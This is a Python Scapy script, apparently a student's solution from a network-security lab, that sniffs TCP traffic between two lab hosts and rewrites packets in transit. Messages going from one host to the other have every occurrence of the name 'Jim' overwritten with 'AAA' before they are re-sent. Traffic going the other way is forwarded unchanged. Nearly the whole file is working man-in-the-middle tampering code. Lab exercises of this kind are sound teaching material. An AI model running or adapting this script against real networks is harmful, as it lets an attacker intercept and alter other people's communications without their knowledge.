#!/usr/bin/env python3

file: messWitYa.py

from scapy.all import *
import string

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05" 
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"

target_name = "Jim"
target_byte = target_name.encode('utf-8')
UNIT = 1

def replace_target(pkt):
    ls(pkt)
    #ls(pkt[TCP].payload)

    if pkt[Ether].src == MAC_M:
        #do nothing, intentionally empty
        pass

    else: 
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:

            # Create a new packet based on the captured one.
            # 1) We need to delete the checksum in the IP & TCP headers, # because our modification will make them invalid.
            # Scapy will recalculate them if these fields are missing. # 2) We also delete the original TCP payload.
            newpkt = IP(bytes(pkt[IP])) 
            del(newpkt.chksum)
            del(newpkt[TCP].payload) 
            del(newpkt[TCP].chksum)
            ################################################################# 
            # # Construct the new payload based on the old payload.
            # Students need to implement this part.
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load # The original payload data 
                easyData = data.decode('utf-8')
                x = easyData.find(target_name)

                if (x == - UNIT):
                    send(newpkt/data)
            
                else:
                    # x marks the spot
                    easyList = list(easyData)
                    for i in range(len(target_name)):
                        easyList[x + i] = 'A'
                    
                    easyStr = ''.join(easyList)
                    newData = easyStr.encode('utf-8')
                    send(newpkt/newData)

            else:
                send(newpkt)
            ################################################################
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A: # Create new packet based on the captured one
            # Do not make any change
            newpkt = IP(bytes(pkt[IP])) 
            del(newpkt.chksum) 
            del(newpkt[TCP].chksum) 
            send(newpkt)


f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=replace_target)